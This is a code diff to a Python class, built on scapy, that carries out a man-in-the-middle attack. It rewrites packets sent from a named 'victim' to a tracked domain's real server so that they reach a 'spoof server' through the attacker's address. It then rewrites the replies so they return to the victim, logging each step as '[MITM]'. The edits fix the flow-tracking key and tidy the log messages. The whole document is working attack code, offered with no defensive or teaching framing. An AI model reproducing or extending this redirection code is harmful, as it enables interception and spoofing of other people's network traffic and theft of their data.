@@ -1,5 +1,4 @@
 from scapy.all import IP, TCP, UDP
-from scapy.layers.inet6 import IPv6
 
 class DomainRedirectFilter:
     def __init__(self, domain_tracker, victim_ip, spoof_ip, attacker_ip, logger=None):
@@ -9,7 +8,7 @@ class DomainRedirectFilter:
         self.spoof_ip = spoof_ip
         self.logger = logger
 
-        # (victim_ip, victim_port, proto) → real_server_ip
+        # (victim_ip, v_sport, s_dport, proto) → real_server_ip
         self.flows = {}
 
     def log(self, msg):
@@ -36,20 +35,20 @@ class DomainRedirectFilter:
 
         # ───── VICTIM → REAL SERVER ─────
         if ip.src == self.victim_ip and ip.dst in self.domain_tracker.ips_v4:
-            self.flows[(self.victim_ip, sport, proto)] = ip.dst
+            self.flows[(self.victim_ip, sport, dport, proto)] = ip.dst
 
-            ip.src = self.attacker_ip      
+            ip.src = self.attacker_ip
             ip.dst = self.spoof_ip
 
             del ip.chksum
             del l4.chksum
 
-            self.log("[MITM] Victim → Spoof")
+            self.log("[MITM] Victim → Spoof server")
             return False
 
         # ───── SPOOF SERVER → ATTACKER ─────
         if ip.src == self.spoof_ip and ip.dst == self.attacker_ip:
-            key = (self.victim_ip, dport, proto)
+            key = (self.victim_ip, dport, sport, proto)
             if key not in self.flows:
                 return False
 
@@ -61,7 +60,7 @@ class DomainRedirectFilter:
             del ip.chksum
             del l4.chksum
 
-            self.log("[MITM] Spoof → Victim")
+            self.log("[MITM] Spoof server → Victim")
             return False
 
         return False
